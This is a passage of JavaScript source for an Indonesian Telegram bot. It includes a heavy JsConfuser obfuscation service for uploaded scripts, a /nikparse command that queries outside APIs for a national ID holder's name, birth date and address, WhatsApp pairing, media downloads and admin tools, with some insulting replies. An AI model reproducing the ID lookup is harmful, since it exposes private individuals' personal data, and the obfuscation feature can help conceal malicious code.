    const originalFilename = doc.file_name || `file-${Date.now()}.js`;
    const filename = sanitizeFilename(originalFilename);

    // Periksa ukuran jika tersedia
    const fileSize = doc.file_size || 0;
    if (fileSize && fileSize > MAX_FILE_SIZE) {
      return ctx.reply(`⚠️ File terlalu besar. Maksimum ${Math.round(MAX_FILE_SIZE / 1024 / 1024)} MB.`);
    }

    // Cek ekstensi/mime dasar
    const isJsMime = /javascript|text\/x-javascript|application\/javascript/i.test(mime);
    const isJsExt = /\.(js|mjs|cjs)$/i.test(filename);
    if (!isJsMime && !isJsExt) {
      return ctx.reply('⚠️ File harus berekstensi .js (mis. .js/.mjs/.cjs) atau memiliki mime type Javascript.');
    }

    await ctx.reply('🔄 Mengunduh file...');

    // Ambil link file dari Telegram
    let fileLinkObj;
    try {
      fileLinkObj = await ctx.telegram.getFileLink(doc.file_id);
    } catch (err) {
      return ctx.reply('❌ Gagal mengambil link file dari Telegram: ' + (err.message || String(err)));
    }

    const fileUrl = (typeof fileLinkObj === 'string') ? fileLinkObj : (fileLinkObj && fileLinkObj.href) ? String(fileLinkObj.href) : String(fileLinkObj);

    const tempIn = path.join(os.tmpdir(), `@hardenc_in_${Date.now()}_${filename}`);
    const tempOut = path.join(os.tmpdir(), `@hardenc_out_${Date.now()}_${filename}`);

    // Download dengan axios (arraybuffer). Cek header content-length bila ada.
    let res;
    try {
      res = await axios.get(fileUrl, { responseType: 'arraybuffer', timeout: 120000, maxContentLength: MAX_FILE_SIZE + 1024 * 1024 });
    } catch (err) {
      return ctx.reply('❌ Gagal mengunduh file dari Telegram: ' + (err.message || String(err)));
    }

    // Jika header content-length ada, cek ulang
    try {
      const cl = res.headers && (res.headers['content-length'] || res.headers['Content-Length']);
      if (cl && Number(cl) > MAX_FILE_SIZE) {
        return ctx.reply('⚠️ File terlalu besar menurut header Content-Length. Batalkan.');
      }
    } catch (e) {
      // ignore
    }

    // Tulis file input sementara (binary)
    try {
      await fsp.writeFile(tempIn, Buffer.from(res.data));
    } catch (err) {
      await safeUnlink(tempIn);
      return ctx.reply('❌ Gagal menyimpan file sementara: ' + (err.message || String(err)));
    }

    await ctx.reply('🔐 Memproses obfuscate (JsConfuser)... Ini mungkin memakan waktu beberapa detik.');

    // Baca konten (utf8). Tangani jika bukan utf8.
    let inputCode;
    try {
      inputCode = await fsp.readFile(tempIn, 'utf8');
    } catch (err) {
      await safeUnlink(tempIn);
      return ctx.reply('❌ Gagal membaca file (mungkin bukan file teks UTF-8): ' + (err.message || String(err)));
    }

    // Pilihan obfuscation (sesuaikan jika perlu)
    const obfOptionsTemplate = {
      target: 'node',
      preset: 'high',
      compact: true,
      minify: true,
      flatten: true,
      identifierGenerator: () => {
        // pastikan hanya karakter ASCII di hasil
        const seed = "素㗊㖶㗅AlwaysAbim㖢จัสตินอย่างเป็นทางการ㖯㖰㗉晴素晴座素AlwaysVero晴จัสตินอย่างเป็นทางการ座素晴難";
        const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        const d = String(seed).replace(/[^a-zA-Z]/g, '') || 'id';
        const rand = (n) => Array.from({ length: n }, () => letters.charAt(Math.random() * letters.length | 0)).join('');
        return d + rand(4);
      },
      renameVariables: true,
      renameGlobals: true,
      stringEncoding: true,
      stringConcealing: true,
      duplicateLiteralsRemoval: 1,
      // stack: true, // jangan set langsung — beberapa versi tidak mengenal opsi ini
      controlFlowFlattening: 1,
      calculator: true,
      hexadecimalNumbers: true,
      movedDeclarations: true,
      objectExtraction: true,
      globalConcealing: true
    };

    // Defensive obfuscation: jika JsConfuser menolak opsi tertentu, hapus dan retry
    let obfResult = null;
    const MAX_RETRIES = 8;
    let opts = Object.assign({}, obfOptionsTemplate);

    for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
      try {
        obfResult = await JsConfuser.obfuscate(inputCode, opts);
        // beberapa implementasi bisa mengembalikan objek atau string; ambil string jika ada
        if (!obfResult || (typeof obfResult !== 'string' && typeof obfResult !== 'object')) {
          throw new Error('JsConfuser mengembalikan hasil yang tidak valid.');
        }
        // jika returned object memiliki .code atau .result, gunakan yang string
        if (typeof obfResult === 'object') {
          if (typeof obfResult.code === 'string') obfResult = obfResult.code;
          else if (typeof obfResult.result === 'string') obfResult = obfResult.result;
          else obfResult = String(obfResult);
        }
        // sekarang pastikan string
        if (typeof obfResult !== 'string') {
          throw new Error('JsConfuser mengembalikan hasil bukan string.');
        }
        break; // sukses
      } catch (err) {
        const msg = (err && err.message) ? err.message : String(err);
        // cocokkan pesan error tipe: Invalid option: 'xxx' atau Unknown option 'xxx'
        const m = msg.match(/(?:Invalid option|Unknown option|unsupported option)[:\s]*['"]?([\w$@-]+)['"]?/i);
        if (m && m[1]) {
          const badKey = m[1];
          if (badKey in opts) {
            delete opts[badKey];
            console.warn(`JsConfuser: menghapus opsi tidak dikenal '${badKey}' dan mencoba ulang (attempt ${attempt + 1})`);
            // retry loop
            continue;
          }
        }
        // jika error lain atau pola tidak terdeteksi, kembalikan error ke user
        await safeUnlink(tempIn);
        return ctx.reply(`❌ Gagal saat proses obfuscate: ${msg}`);
      }
    }

    if (!obfResult) {
      await safeUnlink(tempIn);
      return ctx.reply('❌ Gagal saat proses obfuscate: tidak ada hasil setelah beberapa percobaan. Cek versi JsConfuser atau opsi yang digunakan.');
    }

    // Tulis file output sementara
    try {
      await fsp.writeFile(tempOut, obfResult, 'utf8');
    } catch (err) {
      await safeUnlink(tempIn);
      await safeUnlink(tempOut);
      return ctx.reply('❌ Gagal menulis hasil obfuscate: ' + (err.message || String(err)));
    }

    // Cek ukuran hasil sebelum kirim
    try {
      const stats = await fsp.stat(tempOut);
      if (stats.size > MAX_OUTPUT_SIZE) {
        await safeUnlink(tempIn);
        await safeUnlink(tempOut);
        return ctx.reply(`⚠️ Hasil obfuscate terlalu besar (${Math.round(stats.size / 1024 / 1024)} MB). Batas aman ${Math.round(MAX_OUTPUT_SIZE / 1024 / 1024)} MB.`);
      }
    } catch (e) {
      // jika gagal stat, lanjut coba kirim (tapi tetap cleanup nanti)
    }

    // Kirim file hasil
    try {
      await ctx.replyWithDocument({ source: fs.createReadStream(tempOut), filename: filename }, { caption: '✅ Sukses Encrypt File JS! Type: String' });
    } catch (err) {
      return ctx.reply('❌ Gagal mengirim file hasil: ' + (err.message || String(err)));
    } finally {
      // cleanup
      await safeUnlink(tempIn);
      await safeUnlink(tempOut);
    }

  } catch (error) {
    console.error('enchard error:', error);
    try { await ctx.reply('❌ Terjadi error: ' + (error.message || String(error))); } catch (e) { /* ignore */ }
  }
});
// Fungsi escape MarkdownV2
function escapeMarkdownV2(text) {
  return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
}

// Fungsi komentar
function komentarTampan(nilai) {
  if (nilai >= 100) return "💎 Ganteng dewa seperti Zarr😭, mustahil diciptakan ulang.";
  if (nilai >= 94) return "🔥 Ganteng gila! Mirip artis Korea!";
  if (nilai >= 90) return "😎 Bintang iklan skincare!";
  if (nilai >= 83) return "✨ Wajahmu memantulkan sinar kebahagiaan.";
  if (nilai >= 78) return "🧼 Bersih dan rapih, cocok jadi influencer!";
  if (nilai >= 73) return "🆒 Ganteng natural, no filter!";
  if (nilai >= 68) return "😉 Banyak yang naksir nih kayaknya.";
  if (nilai >= 54) return "🙂 Lumayan sih... asal jangan senyum terus.";
  if (nilai >= 50) return "😐 Gantengnya malu-malu.";
  if (nilai >= 45) return "😬 Masih bisa lah asal percaya diri.";
  if (nilai >= 35) return "🤔 Hmm... mungkin bukan harinya.";
  if (nilai >= 30) return "🫥 Sedikit upgrade skincare boleh tuh.";
  if (nilai >= 20) return "🫣 Coba pose dari sudut lain?";
  if (nilai >= 10) return "😭 Yang penting akhlaknya ya...";
  return "😵 Gagal di wajah, semoga menang di hati.";
}

// Command /cektampan
bot.command('cektampan', checkPremium, checkGroupOnly, async (ctx) => {
  const user = ctx.from;

  const arrNilai = [10, 20, 30, 35, 45, 50, 54, 68, 73, 78, 83, 90, 94, 100];
  const nilai = arrNilai[Math.floor(Math.random() * arrNilai.length)];

  const teks =
    "```\n" +
    "⎙ Hasil Tes Ketampanan\n" +
    `⎈ Nama: ${escapeMarkdownV2(user.first_name)}\n` +
    `☬ Nilai: ${nilai}%\n` +
    `⸙ Komentar: ${escapeMarkdownV2(komentarTampan(nilai))}\n` +
    "```";

  await ctx.reply(teks, { parse_mode: "MarkdownV2" });
});
const yts = require("yt-search");
// -------- Parse Durasi Aman --------
const parseSecs = (s) => {
  try {
    if (typeof s === "number") return s;
    if (!s || typeof s !== "string") return 0;
    return s.split(":").map(n => parseInt(n, 10)).reduce((a, v) => a * 60 + v, 0);
  } catch {
    return 0;
  }
};

// -------- Search YouTube Aman --------
const searchBestVideo = async (query) => {
  try {
    const r = await yts.search(query);
    const list = Array.isArray(r) ? r : (r.videos || []);

    const filtered = list.filter(v => {
      const sec = typeof v.seconds === "number"
        ? v.seconds
        : parseSecs(v.timestamp || v.duration?.timestamp || v.duration);

      return !v.live && sec > 0 && sec <= 1200; // max 20 menit
    });

    return filtered.length ? filtered[0] : null;
  } catch {
    return null;
  }
};

// -------- Download ke Temp Aman --------
const downloadToTemp = async (url, ext) => {
  try {
    const file = path.join(os.tmpdir(), `play_${Date.now()}_${Math.random().toString(36).slice(2)}${ext}`);

    const res = await axios.get(url, {
      responseType: "stream",
      timeout: 180000,
      maxRedirects: 5
    });

    await new Promise((resolve, reject) => {
      const ws = fs.createWriteStream(file);
      res.data.pipe(ws);
      ws.on("finish", resolve);
      ws.on("error", reject);
    });

    return file;
  } catch {
    return null;
  }
};

// -------- Error Reply Aman --------
const fail = (ctx, tag, e) => {
  const text = e?.message || "Terjadi kesalahan.";
  return ctx.reply(`⦸ ${tag}\n${text}`);
};

// -------- COMMAND /PLAY --------
bot.command("play", checkPremium, checkGroupOnly, async (ctx) => {
  let statusMsg;
  try {
    const raw = ctx.message.text.split(" ").slice(1).join(" ");
    const q = raw || ctx.message.reply_to_message?.text;

    if (!q)
      return ctx.reply("🎧 Ketik judul atau reply judul/link");

    // Kirim pesan proses
    statusMsg = await ctx.reply("🔎 Mencari lagu...");

    const isYT = /^https?:\/\/(www\.)?(youtube\.com|youtu\.be)\//i.test(q);

    let video;

    if (isYT) {
      video = { url: q, title: "YouTube Audio" };
    } else {
      const found = await searchBestVideo(q);
      if (!found) return ctx.reply("⦸ Tidak ada hasil ditemukan.");
      video = found;
    }

    // Update proses
    await ctx.telegram.editMessageText(
      statusMsg.chat.id,
      statusMsg.message_id,
      null,
      "⏳ Mengambil data..."
    );

    // Hit API
    const api = `https://restapi-v2.simplebot.my.id/download/ytdl?url=${encodeURIComponent(video.url)}`;
    const r = await axios.get(api, { timeout: 60000 }).catch(() => null);

    if (!r || !r.data || !r.data.status || !r.data.result)
      return ctx.reply("⦸ Gagal mengambil data dari API.");

    const result = r.data.result;
    const mp3 = result.mp3;

    if (!mp3)
      return ctx.reply("⦸ API tidak menyediakan file MP3.");

    // Update proses
    await ctx.telegram.editMessageText(
      statusMsg.chat.id,
      statusMsg.message_id,
      null,
      "⎙ Sedang mengunduh audio..."
    );

    // Download
    const file = await downloadToTemp(mp3, ".mp3");
    if (!file) return ctx.reply("⦸ Gagal download audio.");

    // Update proses terakhir
    await ctx.telegram.editMessageText(
      statusMsg.chat.id,
      statusMsg.message_id,
      null,
      "⎙ Mengirim audio ke kamu..."
    );

    await ctx.replyWithAudio(
      { source: file },
      {
        caption: `🎧 ${result.title}\n© EXERCISE GOTSHH (⸙)`,
        title: result.title || "Audio",
        performer: "YouTube"
      }
    );

    try { fs.unlinkSync(file); } catch {}

    // Hapus pesan proses setelah selesai
    setTimeout(() => {
      ctx.telegram.deleteMessage(statusMsg.chat.id, statusMsg.message_id).catch(() => {});
    }, 2000);

  } catch (e) {
    if (statusMsg) {
      try {
        await ctx.telegram.editMessageText(
          statusMsg.chat.id,
          statusMsg.message_id,
          null,
          `⦸ Proses gagal.\n${e.message}`
        );
      } catch {}
    }
    return fail(ctx, "Proses gagal", e);
  }
});
bot.command("nikparse", checkPremium, checkGroupOnly, async (ctx) => {
  const nik = ctx.message.text.split(" ").slice(1).join("").trim();
  if (!nik) return ctx.reply("🪧 Format: /nikparse 1234567890283625");
  if (!/^\d{16}$/.test(nik)) return ctx.reply("❌ ☇ NIK harus 16 digit angka");

  const wait = await ctx.reply("⎙ ☇ Sedang memproses pengecekan NIK");

  // Fungsi reply
  const replyHTML = (d) => {
    const get = (x) => (x ?? "-");

    const caption = `
<blockquote><pre>⬡═―—⊱ ⎧ EXERCISE GOTSHH ⎭ ⊰―—═⬡</pre></blockquote>
⌑ NIK: ${get(d.nik) || nik}
⌑ Nama: ${get(d.nama)}
⌑ Jenis Kelamin: ${get(d.jenis_kelamin || d.gender)}
⌑ Tempat Lahir: ${get(d.tempat_lahir || d.tempat)}
⌑ Tanggal Lahir: ${get(d.tanggal_lahir || d.tgl_lahir)}
⌑ Umur: ${get(d.umur)}
⌑ Provinsi: ${get(d.provinsi || d.province)}
⌑ Kabupaten/Kota: ${get(d.kabupaten || d.kota || d.regency)}
⌑ Kecamatan: ${get(d.kecamatan || d.district)}
⌑ Kelurahan/Desa: ${get(d.kelurahan || d.village)}
`;
    return ctx.reply(caption, { parse_mode: "HTML", disable_web_page_preview: true });
  };

  // ============================
  // 🔍 Try 1 → API Akuari
  // 🔍 Try 2 → API NikParser
  // ============================
  try {
    const a1 = await axios.get(
      `https://api.akuari.my.id/national/nik?nik=${nik}`,
      { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
    );

    if (a1?.data?.status && a1?.data?.result) {
      return await replyHTML(a1.data.result);
    }
  } catch {}

  // Try API kedua
  try {
    const a2 = await axios.get(
      `https://api.nikparser.com/nik/${nik}`,
      { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
    );

    if (a2?.data) {
      return await replyHTML(a2.data);
    }

    return ctx.reply("❌ ☇ NIK tidak ditemukan");
  } catch (err) {
    return ctx.reply("❌ ☇ Gagal menghubungi server, coba lagi nanti");
  }
});
// ================================
bot.command("infopanel", checkPremium, checkGroupOnly, async (ctx) => {
  try {
    await ctx.reply("⎙ Mengambil informasi sistem panel...");

    // RAM
    const totalRam = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
    const usedRam =
      (totalRam - os.freemem() / 1024 / 1024 / 1024).toFixed(2);
    const freeRam = (os.freemem() / 1024 / 1024 / 1024).toFixed(2);
    const ramUsage = ((usedRam / totalRam) * 100).toFixed(2);

    // CPU
    const cpu = os.cpus()[0];
    const model = cpu.model;
    const core = os.cpus().length;

    // Load Average (1 minute)
    const load = os.loadavg()[0].toFixed(2);

    // Uptime
    const uptimeSeconds = os.uptime();
    const uptimeJam = Math.floor(uptimeSeconds / 3600);
    const uptimeMenit = Math.floor((uptimeSeconds % 3600) / 60);

    // Node version
    const nodev = process.version;

    const text = `
⎙ *Informasi Panel / Server*
──────────────────────────────

💾 *Memory (RAM)*
• Total: *${totalRam} GB*
• Terpakai: *${usedRam} GB*
• Tersisa: *${freeRam} GB*
• Penggunaan: *${ramUsage}%*

⚙️ *Processor*
• Model: *${model}*
• Core: *${core}*
• Beban: *${load}*

🕒 *Uptime:* ${uptimeJam} jam ${uptimeMenit} menit
🌐 *Platform:* ${os.platform().toUpperCase()}
🧩 *Node.js:* ${nodev}
──────────────────────────────

🛰️ *Status:* Online & Stabil
`;

    ctx.reply(text, { parse_mode: "Markdown" });
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi kesalahan saat mengambil informasi sistem.");
  }
});
bot.command("infogempa", checkPremium, checkGroupOnly, async (ctx) => {
  try {

    // ===== Kirim pesan progres =====
    const loadingMsg = await ctx.reply("⎙  Mengambil data gempa dari BMKG...");

    // Fetch data BMKG
    const res = await fetch("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json");
    const json = await res.json();
    const data = json.Infogempa.gempa;

    // Buat caption
    let caption = `📡 *Informasi Gempa Terkini*\n\n`;
    caption += `📅 Tanggal: ${data.Tanggal}\n`;
    caption += `🕒 Waktu: ${data.Jam}\n`;
    caption += `📍 Wilayah: ${data.Wilayah}\n`;
    caption += `📈 Magnitudo: ${data.Magnitude}\n`;
    caption += `📏 Kedalaman: ${data.Kedalaman}\n`;
    caption += `📌 Koordinat: ${data.Coordinates}\n`;
    caption += `🧭 Lintang: ${data.Lintang} | Bujur: ${data.Bujur}\n`;
    caption += `⚠️ Potensi: *${data.Potensi}*\n`;
    if (data.Dirasakan) caption += `💬 Dirasakan: ${data.Dirasakan}\n`;
    caption += `\n🛡️ Support: @HanzSyn`;

    // Ambil peta shakemap
    const mapUrl = `https://data.bmkg.go.id/DataMKG/TEWS/${data.Shakemap}`;
    const buffer = await fetch(mapUrl).then((r) => r.arrayBuffer());
    const image = await sharp(Buffer.from(buffer)).png().toBuffer();

    // Update pesan progres
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      loadingMsg.message_id,
      undefined,
      "📤 Mengirim hasil..."
    );

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      loadingMsg.message_id,
      undefined,
      "📸 Mengirim gambar shakemap..."
    );

    // Kirim hasil final
    await ctx.replyWithPhoto({ source: image }, {
      caption,
      parse_mode: "Markdown"
    });

    // Hapus pesan progres
    await ctx.telegram.deleteMessage(ctx.chat.id, loadingMsg.message_id);

  } catch (err) {
    console.error("Error infogempa:", err);
    ctx.reply("❌ Gagal mengambil data gempa dari BMKG.");
  }
});

bot.command("addadmin", checkGroupOnly,checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example: /Addadmin 12345678"
    );
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ bocah ${userId} sudah memiliki status admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ bocah ${userId} sekarang memiliki akses admin!`);
});
bot.command("addprem", checkGroupOnly, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" "); 

  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /addprem 12345678");
  }

  const userId = args[1].toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ kacung ${userId} sudah memiliki akses premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`✅ anak ${userId} kacung sekarang adalah premium.`);
});
///=== comand del admin ===\\\
bot.command("deladmin", checkGroupOnly, checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /deladmin 12345678"
    );
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ wkwkw ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 mampus ${userId} telah dihapus dari daftar Admin.`);
});
bot.command("delprem", checkGroupOnly, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /delprem 12345678"
    );
  }

  const userId = args[1].toString();

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ wkwkw ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 mampus ${userId} telah dihapus dari akses premium.`);
});
// Perintah untuk mengecek status premium
bot.command("cekprem", checkGroupOnly, checkAdmin, (ctx) => {
  const userId = ctx.from.id.toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ anak kacung sudah menjadi premium.`);
  } else {
    return ctx.reply(`❌ lawak bego lu bukan pengguna premium.`);
  }
});
bot.command("setcd", checkGroupOnly, checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  const cd = args[1];

  if (!cd) return ctx.reply("Format: /setcd 1m | 30s | 1h");

  const time = ms(cd);
  if (isNaN(time)) return ctx.reply("Format waktu tidak valid.");

  const data = readCooldownData();
  data.payload.cooldown = time;
  data.payload.lastUsed = 0;
  saveCooldownData(data);

  ctx.reply(`✅ Cooldown diatur ke *${ms(time, { long: true })}*`, {
    parse_mode: "Markdown",
  });
});
///=============grouponly==========\\\
bot.command("grouponly", checkAdmin,
async (ctx) => {
const arg = ctx.message.text.split(" ")[1];
if (!arg || !["on", "off"].includes(arg)) {
return ctx.reply("Example:\n:/grouponly on\n/grouponly off");
}

groupOnlyStatus.enabled = arg === "on";
saveGroupOnly();

return ctx.reply(`⎈ grouponly mode now *${groupOnlyStatus.enabled ? "active group only" : "inactive private only"}*`, { parse_mode: "Markdown" });
});
// Command untuk pairing WhatsApp
bot.command("reqpair", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply("❌ Format Salah!. Example : /reqpair <nomor_wa>");
  }

  let phoneNumber = args[1];
  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");
 
 if (Abim && Abim.user) {
    return await ctx.reply("🛡️ Whatsapp Sudah Terhubung mau menghibung lagi ? hapus ulang hapus sessions di panel");
  }
  
  try {
    const code = await Abim.requestPairingCode(phoneNumber, "RULZBILA");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃ 𝗡𝗼𝗺𝗼𝗿 : ${phoneNumber}
┃ 𝗖𝗼𝗱𝗲 : <code>${formattedCode}</code>
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Hapus", callback_data: "Close" }]],
      },
    });
  } catch (error) {
    console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply("gunakan delsesi untuk menyambung ulang atau hapus file sesion di panel terus restart panel");
  }
});
// Handler untuk tombol close
bot.action("Close", async (ctx) => {
  const userId = ctx.from.id.toString();

  if (!OWNER_IDS.includes(userId)) {
    return ctx.answerCbQuery("Lu Siapa Kontol", { show_alert: true });
  }

  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error(chalk.red("Gagal menghapus pesan:"), error);
    await ctx.answerCbQuery("❌ Gagal menghapus pesan!", { show_alert: true });
  }
});
///=== comand del sesi ===\\\\
bot.command("delsesi", checkGroupOnly, checkAdmin, (ctx) => {
  const success = deleteSession();

  if (success) {
    ctx.reply("✅ Session berhasil di hapus, silahkan connect ulang");
  } else {
    ctx.reply("❌ Tidak ada session yang tersimpan saat ini.");
  }
});
// Simpan kata
const badWords = {};

// CMD /setwarn <kata>
bot.command("setwarn", async (ctx) => {
  if (!ctx.chat || ctx.chat.type === "private") return;

  const member = await ctx.getChatMember(ctx.from.id);
  if (member.status !== "administrator" && member.status !== "creator") {
    return ctx.reply("❌ Hanya admin yang bisa set kata terlarang");
  }

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) {
    return ctx.reply("❌ Contoh:\n/setwarn kontol");
  }

  const chatId = ctx.chat.id;
  if (!badWords[chatId]) badWords[chatId] = [];

  badWords[chatId].push(text.toLowerCase());

  ctx.reply(`🚫 Kata terlarang ditambahkan:\n"${text}"`);
});

// Detekesi Pesan
// Simpan status antilink & warning (simple memory)
const antiLink = {};
const warns = {};

const linkRegex = /((https?:\/\/)?([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,})(\/\S*)?/gi;

// CMD /antilink on|off (admin only)
bot.command("antilink", async (ctx) => {
  if (!ctx.chat || ctx.chat.type === "private") return;

  const member = await ctx.getChatMember(ctx.from.id);
  if (member.status !== "administrator" && member.status !== "creator") {
    return ctx.reply("❌ Hanya admin yang bisa pakai command ini");
  }

  const args = ctx.message.text.split(" ");
  const option = args[1];

  if (!option || !["on", "off"].includes(option)) {
    return ctx.reply("Contoh:\n/antilink on\n/antilink off");
  }

  antiLink[ctx.chat.id] = option === "on";
  ctx.reply(`🔗 AntiLink ${option === "on" ? "AKTIF" : "NONAKTIF"}`);
});
// === COMMAND /tagall ===
bot.command("tagall", async (ctx) => {
  const chatId = ctx.chat.id;

  if (ctx.chat.type === "private") return;

  const member = await ctx.telegram.getChatMember(chatId, ctx.from.id);
  if (!["administrator", "creator"].includes(member.status)) {
    return ctx.reply("❌ Hanya admin yang bisa gunakan perintah ini.");
  }

  const messageText = ctx.message.text.split(" ").slice(1).join(" ") || "Tag semua!";
  let mentions = "";

  try {
    const admins = await ctx.telegram.getChatAdministrators(chatId);

    for (const admin of admins) {
      const user = admin.user;
      const name = escapeHTML(user.first_name || "User");
      mentions += `<a href="tg://user?id=${user.id}">${name}</a> `;
    }

    await ctx.replyWithHTML(`${escapeHTML(messageText)}\n\n${mentions}`);
  } catch (err) {
    console.error("Gagal tag semua:", err);
    ctx.reply("❌ Gagal mention semua anggota.");
  }
});
// === COMMAND /searchdouyin ===
bot.command("searchdouyin", async (ctx) => {
  try {
    const query = ctx.message.text.split(" ").slice(1).join(" ");
    if (!query) {
      return ctx.reply("❌ Contoh:\n/searchdouyin beautiful girl");
    }

    await ctx.reply("🔍 Mencari video Douyin...");

    const api = `https://ikyyzyyrestapi.my.id/search/douyin?apikey=kyzz&query=${encodeURIComponent(query)}`;
    const { data } = await axios.get(api, { timeout: 20000 });

    if (!data.status || !data.result || data.result.length === 0) {
      return ctx.reply("❌ Video tidak ditemukan.");
    }

    const v = data.result[0];

    const caption = `
<b>🎵 Douyin Video</b>

📝 ${escapeHTML(v.description)}
👤 Author: ${escapeHTML(v.author.nickname)}
🎶 Music: ${escapeHTML(v.music.title)}
⏱ Durasi: ${v.music.duration}s

🔗 https://www.douyin.com/video/${v.video_id}
`.trim();

    await ctx.replyWithVideo(
      { url: v.video_url },
      {
        caption,
        parse_mode: "HTML",
      }
    );

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Gagal mengambil video Douyin.");
  }
});
// === COMMAND /capcutsearch ===
bot.command("capcutsearch", async (ctx) => {
  try {
    const q = ctx.message.text.split(" ").slice(1).join(" ");
    if (!q)
      return ctx.reply("❗ Contoh:\n/capcutsearch jj viral tiktok");

    const loading = await ctx.reply("🔍 Mencari template CapCut...");

    const { data } = await axios.get(
      "https://ikyyzyyrestapi.my.id/search/capcut",
      { params: { q } }
    );

    if (!data.status || !data.result?.length)
      return ctx.telegram.editMessageText(
        ctx.chat.id,
        loading.message_id,
        null,
        "❌ Template tidak ditemukan."
      );

    const v = data.result[0];

    const caption =
`🎬 *CapCut Search*

📌 Judul : *${v.title}*
⏱ Durasi : ${v.duration}
▶️ Play : ${v.stats.play}
❤️ Like : ${v.stats.like}
⭐ Favorit : ${v.stats.favorite}`;

    await ctx.replyWithVideo(
      v.video.no_watermark,
      {
        caption,
        parse_mode: "Markdown"
      }
    );

    await ctx.deleteMessage(loading.message_id);

  } catch (err) {
    console.error(err?.response?.data || err);
    ctx.reply("❌ Gagal mengambil data CapCut.");
  }
});
// === COMMAND /meme ===
bot.command("meme", async (ctx) => {
  try {
    const { data } = await axios.get("https://meme-api.com/gimme");
    ctx.replyWithPhoto(data.url, { caption: data.title });
  } catch {
    ctx.reply("Gagal ambil meme.");
  }
});
bot.command("otakudesu", async (ctx) => {
  try {
    const query = ctx.message.text.split(" ").slice(1).join(" ");
    if (!query) {
      return ctx.reply("❌ Contoh:\n/otakudesu one piece");
    }

    await ctx.reply("🔍 Mencari anime di Otakudesu...");

    const api = `https://ikyyzyyrestapi.my.id/anime/otakudesu/search?query=${encodeURIComponent(query)}`;
    const { data } = await axios.get(api, { timeout: 20000 });

    if (!data.status || !data.result || data.result.length === 0) {
      return ctx.reply("❌ Anime tidak ditemukan.");
    }

    // ambil max 3 biar aman
    const results = data.result.slice(0, 3);

    for (const a of results) {
      const caption = `
<b>🎌 ${escapeHTML(a.title)}</b>

📺 ${escapeHTML(a.status)}
🎭 ${escapeHTML(a.genres)}

🔗 ${a.url}
`.trim();

      await ctx.replyWithPhoto(
        { url: a.thumb },
        {
          caption,
          parse_mode: "HTML",
        }
      );
    }

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Gagal mengambil data anime.");
  }
});
// === COMMAND /toprompt ===
bot.command("toprompt", async (ctx) => {
  try {
    let fileId;

    // ===============================
    // 1️⃣ Ambil Foto
    // ===============================
    if (ctx.message.reply_to_message?.photo) {
      fileId = ctx.message.reply_to_message.photo.slice(-1)[0].file_id;
    } 
    else if (ctx.message.photo) {
      fileId = ctx.message.photo.slice(-1)[0].file_id;
    } 
    else {
      return ctx.reply("❌ Kirim atau reply foto dengan command ini.");
    }

    const loading = await ctx.reply("📤 Mengupload gambar...");

    // ===============================
    // 2️⃣ Download dari Telegram
    // ===============================
    const fileLink = await ctx.telegram.getFileLink(fileId);

    const imageBuffer = await axios.get(fileLink.href, {
      responseType: "arraybuffer"
    });

    // ===============================
    // 3️⃣ Upload ke Uguu
    // ===============================
    const form = new FormData();
    form.append("files[]", imageBuffer.data, "image.jpg");

    const upload = await axios.post("https://uguu.se/upload.php", form, {
      headers: form.getHeaders()
    });

    if (!upload.data?.files?.[0]?.url) {
      await ctx.deleteMessage(loading.message_id).catch(() => {});
      return ctx.reply("❌ Gagal upload gambar.");
    }

    const imageUrl = upload.data.files[0].url;

    await ctx.deleteMessage(loading.message_id).catch(() => {});
    const processing = await ctx.reply("🧠 Mengubah gambar jadi prompt...");

    // ===============================
    // 4️⃣ Call API img2prompt
    // ===============================
    const res = await axios.get(
      "https://ikyyzyyrestapi.my.id/tools/img2prompt",
      {
        params: { url: imageUrl },
